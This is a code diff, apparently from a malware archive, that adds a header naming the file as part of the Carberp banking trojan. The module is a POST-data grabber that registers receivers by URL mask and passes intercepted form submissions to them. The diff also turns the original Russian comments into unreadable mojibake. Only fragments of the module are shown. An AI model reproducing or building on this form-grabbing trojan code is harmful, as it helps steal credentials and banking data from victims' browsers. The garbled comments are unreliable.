@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "PostDataGrabber.h"
 #include "String.h"
 #include "BotClasses.h"
@@ -17,10 +28,10 @@ namespace POSTDATADBG
 namespace PostDataGrabber
 {
 
-PList receivers = 0; //получатели
-DWORD PID = 0; //для предотвращения повторной инициализации
+PList receivers = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD PID = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//основбождение памяти использованной при создании Receiver
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Receiver
 static void DelItemReceiver( void* r )
 {
 	Receiver* rr = (Receiver*)r;
@@ -29,8 +40,8 @@ static void DelItemReceiver( void* r )
 
 bool Init()
 {
-	if( !IsNewProcess(PID) ) //в том же процессе, инициализация уже была
-		return true; //инициализация уже была, поэтому говорим, что инициализация успешная
+	if( !IsNewProcess(PID) ) //пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		return true; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	receivers = List::Create();
 	if( !receivers )
 		return false;
@@ -61,7 +72,7 @@ Receiver* AddReceiver( const char* urlMask, TypeFuncReceiver FuncReceiver )
 	return ret;
 }
 
-//рассылка событий получателям
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void DoEvents( const char* url, const char* postData )
 {
 	int count = List::Count(receivers);
